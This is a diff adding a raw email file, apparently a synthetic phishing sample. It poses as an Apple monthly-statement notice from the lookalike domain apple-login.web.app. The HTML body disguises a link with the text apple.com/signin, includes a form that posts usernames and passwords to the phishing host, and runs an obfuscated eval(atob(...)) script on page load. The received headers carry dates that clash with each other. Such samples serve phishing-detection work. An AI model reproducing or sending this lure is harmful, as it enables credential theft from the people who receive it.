@@ -1,0 +1,31 @@
+From: notice@apple-login.web.app
+To: victim12@example.com
+Subject: Monthly statement available [ref U9B44C0]
+Date: Tue, 08 Mar 2002 21:33:00 -0500
+Message-ID: <phish-192-fa2b5bcf-6579-4fd6-a12e-39a23ffe3c6a@apple-login.web.app>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 09 Mar 2002 23:24:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 27 Mar 2002 17:49:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 09 Mar 2002 09:36:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 13 Mar 2002 00:01:00 -0500
+Return-Path: <notice@apple-login.web.app>
+Reply-To: notice@apple-login.web.app
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=apple-login.web.app; dkim=pass header.d=apple-login.web.app; dmarc=pass header.from=apple-login.web.app
+Received-SPF: pass (mx.example.com: domain of notice@apple-login.web.app designates 192.0.2.52 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=apple-login.web.app; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-192-a7c5209d"
+
+--bnd-p-192-a7c5209d
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+Your monthly statement is ready. Open the link below.
+https://apple-login.web.app/statement/U9B44C0
+
+Reference: U9B44C0
+--bnd-p-192-a7c5209d
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>Your monthly statement is ready. Open the link below.<br/>https://apple-login.web.app/statement/U9B44C0<br/><br/>Reference: U9B44C0</p><p><a href="http://apple-login.web.app/login">https://www.apple.com/signin</a></p><form action="http://apple-login.web.app/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-192-a7c5209d--
